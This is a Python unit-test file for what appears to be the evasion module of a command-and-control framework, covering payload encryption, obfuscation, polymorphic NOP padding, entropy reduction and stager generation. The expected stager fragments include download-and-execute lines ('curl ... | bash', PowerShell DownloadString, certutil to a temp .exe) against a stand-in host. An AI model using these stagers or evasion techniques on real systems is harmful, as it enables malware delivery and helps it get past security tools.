"""Hermetic tests for reversible payload transformation helpers."""

from __future__ import annotations

import base64
import struct

import pytest
from cryptography.exceptions import InvalidTag

from core.c2 import evasion

pytestmark = pytest.mark.unit


def test_xor_encoding_is_reversible_and_rejects_empty_keys() -> None:
    with pytest.raises(ValueError, match="XOR key must not be empty"):
        evasion.xor_encode(b"payload", b"")

    encoded = evasion.xor_encode(b"payload", b"key")
    assert encoded != b"payload"
    assert evasion.xor_encode(encoded, b"key") == b"payload"
    assert evasion.xor_encode(b"", b"key") == b""


def test_aes_payload_round_trip_and_validation(monkeypatch: pytest.MonkeyPatch) -> None:
    values = {32: b"k" * 32, 12: b"n" * 12}
    monkeypatch.setattr(evasion.secrets, "token_bytes", values.__getitem__)

    encrypted, key = evasion.aes_encrypt_payload(b"fixture payload")

    assert key == b"k" * 32
    assert encrypted.startswith(b"n" * 12)
    assert evasion.aes_decrypt_payload(encrypted, key) == b"fixture payload"

    with pytest.raises(ValueError, match="Key must be 32 bytes"):
        evasion.aes_decrypt_payload(encrypted, b"short")
    with pytest.raises(ValueError, match="Encrypted blob too short"):
        evasion.aes_decrypt_payload(b"short", key)
    with pytest.raises(InvalidTag):
        evasion.aes_decrypt_payload(encrypted[:-1] + b"x", key)


def test_multilayer_base64_round_trip_and_loop_boundaries() -> None:
    with pytest.raises(ValueError, match="Layers must be ≥ 1"):
        evasion.base64_multilayer(b"fixture", layers=0)

    encoded = evasion.base64_multilayer(b"fixture", layers=2)
    assert evasion.base64_multilayer_decode(encoded, layers=2) == b"fixture"
    assert evasion.base64_multilayer_decode("plain", layers=0) == b"plain"
    assert base64.b64decode(base64.b64decode(encoded)) == b"fixture"


def test_string_obfuscation_handles_empty_and_mixed_groups(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    sizes = iter((1, 3))
    monkeypatch.setattr(evasion.random, "randint", lambda *_args: next(sizes))

    assert evasion.string_obfuscate("") == '""'
    assert evasion.string_obfuscate("abc") == "chr(97)+chr(98)+chr(99)"


@pytest.mark.parametrize(
    ("method", "fragment"),
    [
        ("POWERSHELL", "DownloadString('https://fixture.test/payload')"),
        ("python", "urllib.request.urlopen('https://fixture.test/payload')"),
        ("curl", "curl -sk https://fixture.test/payload | bash"),
    ],
)
def test_stager_generation_selects_supported_templates(method: str, fragment: str) -> None:
    assert fragment in evasion.generate_stager("https://fixture.test/payload", method)


def test_certutil_stager_and_unknown_method(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(evasion.secrets, "token_hex", lambda _size: "deadbeef")

    certutil = evasion.generate_stager("https://fixture.test/payload", "certutil")
    assert "C:\\Windows\\Temp\\deadbeef.exe" in certutil

    with pytest.raises(ValueError, match="Unsupported stager method: unknown"):
        evasion.generate_stager("https://fixture.test/payload", "unknown")


def test_polymorphic_wrapper_uses_bounded_prefix_and_suffix(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    lengths = iter((4, 2))
    monkeypatch.setattr(evasion.random, "randint", lambda *_args: next(lengths))
    monkeypatch.setattr(evasion.random, "choice", lambda choices: choices[0])

    assert evasion.polymorphic_wrapper(b"body") == b"\x90" * 4 + b"body" + b"\x90" * 2


def test_entropy_reduction_round_trip_empty_and_nonempty_values() -> None:
    assert evasion.entropy_restore(evasion.entropy_reduce(b"")) == b""

    original = bytes(range(20))
    reduced = evasion.entropy_reduce(original)
    assert reduced[:4] == struct.pack("<I", len(original))
    assert evasion.entropy_restore(reduced) == original


def test_entropy_restore_rejects_missing_and_truncated_data() -> None:
    with pytest.raises(ValueError, match="Padded data too short"):
        evasion.entropy_restore(b"abc")

    truncated = struct.pack("<I", 2) + b"xAAA"
    with pytest.raises(ValueError, match="expected 2 bytes, got 1"):
        evasion.entropy_restore(truncated)
